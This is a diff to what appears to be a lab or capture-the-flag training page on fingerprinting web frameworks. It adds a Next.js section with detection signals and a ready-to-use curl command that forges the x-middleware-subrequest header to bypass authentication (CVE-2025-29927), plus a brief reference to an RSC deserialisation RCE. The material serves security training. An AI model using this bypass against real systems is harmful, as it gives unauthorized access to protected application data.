@@ -7,6 +7,7 @@ Fingerprinting modern web stacks from passive HTTP signals, then exploiting a kn
 **Table of contents**
 
 - [MERN stack](#mern-stack)
+- [Next.js](#nextjs)
 - [Django](#django)
 
 ---
@@ -74,6 +75,58 @@ curl -b cookies.txt http://10.130.132.26:3000/api/admin/flag
 <div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
 <strong>Warning:</strong> Prototype pollution mutates global process state. Only run it against authorized targets — it can affect other users and crash the app.
 </div>
+
+---
+
+## Next.js
+
+**Next.js** builds on Express/Node and is the dominant React framework for production apps — investor dashboards, customer portals, marketing sites. On Ubuntu it runs as a Node process (`npm run build && npm start`). The **App Router** (default since v14) enables **React Server Components (RSC)**, which stream server-rendered output to the browser over the binary **RSC Flight protocol** — the surface behind CVE-2025-55182.
+
+<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
+<strong>Note:</strong> Both CVEs below affect <strong>production build mode</strong> only (<code>npm run build &amp;&amp; npm start</code>). Neither manifests under <code>next dev</code> — if fingerprinting shows a dev server, they don't apply.
+</div>
+
+### Fingerprinting
+
+```bash
+curl -I http://TARGET:3001/
+```
+
+| Signal | Value | Confidence |
+| --- | --- | --- |
+| `X-Powered-By` header | `Next.js` | High |
+| HTML source | `window.__next_f` in a `<script>` | High (confirms App Router) |
+| Static asset paths | `/_next/static/chunks/` | High |
+| Middleware headers | `x-middleware-next` / `x-middleware-rewrite` | Medium |
+| Redirect to protected route | HTTP 307 to `/login` | Medium |
+
+**`window.__next_f`** is the definitive App Router indicator — the hydration array for RSC data, injected into every App Router page. It never appears in Pages Router or other frameworks.
+
+### CVE-2025-29927 — Middleware auth bypass
+
+Middleware runs before every request and is where most Next.js apps put authentication. Next.js uses an internal header, **`x-middleware-subrequest`**, to avoid infinite loops when middleware forwards a request to itself — telling the framework "middleware already ran, skip it."
+
+**The flaw:** Next.js never verified the header came from an *internal* process. Send it yourself and middleware — including the auth check — is skipped entirely. The value is the middleware module path repeated **five times**.
+
+```bash
+# Baseline: no cookie -> redirected to /login (middleware working)
+curl -v http://TARGET:3001/dashboard          # -> 307 Location: /login
+
+# Bypass: forge the internal subrequest header
+curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
+  http://TARGET:3001/dashboard
+# -> DashboardFlag: ...
+```
+
+**CVSS 9.1 Critical** — full auth bypass with a single header, no credentials.
+
+<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
+<strong>Info:</strong> With a <code>/src</code> directory layout the value becomes <code>src/middleware</code> repeated five times. Check whether <code>middleware.ts</code> sits at the project root or under <code>src/</code>.
+</div>
+
+### CVE-2025-55182 — RSC Flight RCE (reference)
+
+Unauthenticated **RCE via insecure deserialisation** in the RSC Flight protocol parser. Affects Next.js 14 (≥ 14.3.0-canary.77) and 15.x (< 15.2.3) paired with React 19. **CVSS 10.0 Critical.** Covered in depth (probe → command execution, detection, remediation) in the dedicated *CVE-2025-55182: React2Shell* room — out of scope for this fingerprinting-focused task.
 
 ---
 
